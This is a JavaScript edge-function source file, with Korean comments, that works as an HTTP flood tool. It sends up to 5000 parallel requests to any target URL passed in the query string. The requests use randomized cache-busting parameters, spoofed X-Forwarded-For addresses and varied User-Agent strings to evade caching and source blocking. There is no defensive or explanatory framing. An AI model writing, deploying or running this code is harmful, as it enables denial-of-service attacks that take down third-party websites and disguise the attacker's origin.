export const config = { runtime: 'edge' };

export default async function handler(req) {
    const url = new URL(req.url);
    const target = url.searchParams.get('target');
    const count = parseInt(url.searchParams.get('count') || '100');
    
    if (!target) {
        return new Response("TARGET_MISSING", { status: 400 });
    }
    
    // 타겟 검증 (http/https만)
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return new Response("INVALID_PROTOCOL: Use http:// or https://", { status: 400 });
    }
    
    // 병렬 요청
    const promises = [];
    for (let i = 0; i < Math.min(count, 5000); i++) {
        const randUrl = target + (target.includes('?') ? '&' : '?') + '_=' + Math.random() + Date.now();
        promises.push(
            fetch(randUrl, {
                headers: {
                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${Math.floor(Math.random()*50+70)}`,
                    'Cache-Control': 'no-cache, no-store'
                },
                cache: 'no-store'
            }).catch(() => null)
        );
    }
    
    const results = await Promise.allSettled(promises);
    const success = results.filter(r => r.status === 'fulfilled' && r.value && r.value.ok !== false).length;
    
    return new Response(`✅ Sent ${count} requests to ${target}\n✅ Successful: ${success}\n❌ Failed: ${count - success}\n⚡ Edge Function executed`);
}
